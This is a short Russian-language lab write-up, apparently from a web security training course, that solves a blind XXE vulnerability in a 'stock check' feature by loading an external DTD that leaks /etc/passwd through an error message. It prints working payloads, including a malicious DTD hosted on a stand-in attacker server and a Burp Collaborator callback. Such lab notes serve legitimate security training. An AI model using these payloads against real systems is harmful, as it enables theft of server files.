Эта лаборатория имеет функцию «проверка запасов», которая анализирует вход XML, но не отображает результат.

Чтобы решить лабораторию, используйте внешний DTD, чтобы запустить сообщение об ошибке, которое отображает содержимое `/etc/passwd` файл.

Лаборатория содержит ссылку на сервер эксплойтов в другом домене, где вы можете размещать свой вредоносной DTD.

## Дано

Уязвимость в  функции «проверка запасов»
Уязвимость Blind

# Задачи вывести 

отобразить содержимое `/etc/passwd` 

# Решение 

Проверяем внешние dtd пингом
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
	<!ENTITY % xxe SYSTEM "http://web-attacker.com"> 
	%xxe; 
]>
<stockCheck>
	<productId>1</productId>
	<storeId>1</storeId>
</stockCheck>
```
- Ответ
`"XML parser exited with error: org.xml.sax.SAXParseException; systemId: http://nneo4z15awsywa0dhn5cgm7kkbq2es2h.oastify.com; lineNumber: 1; columnNumber: 2; The markup declarations contained or pointed to by the document type declaration must be well-formed."`

- В burp collaborator получили пинг 

#### Микро итог
Мы получаем ошибку о работе сканера при этом сканер обрабатывает внешнюю дтд

Пробуем закинуть нагрузку на ошибку
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
	<!ENTITY % file SYSTEM "file:///etc/passwd"> 
	<!ENTITY % xxe SYSTEM "http://web-attacker.com/file;"> 
	%xxe; 
]>
<stockCheck>
	<productId>1</productId>
	<storeId>1</storeId>
</stockCheck>
```
- Ответ в ошибке не увидели пробуем через эксплоит 

Формируем запрос на наш сервер
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
	<!ENTITY % xxe SYSTEM "http://web-attacker.com;"> 
	%xxe; 
]>
<stockCheck>
	<productId>1</productId>
	<storeId>1</storeId>
</stockCheck>
```

Нагрузка на сервере
```
<!ENTITY % file SYSTEM "file:///etc/passwd"> 
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///invalid/%file;'>"> 
%eval; 
%error;
```
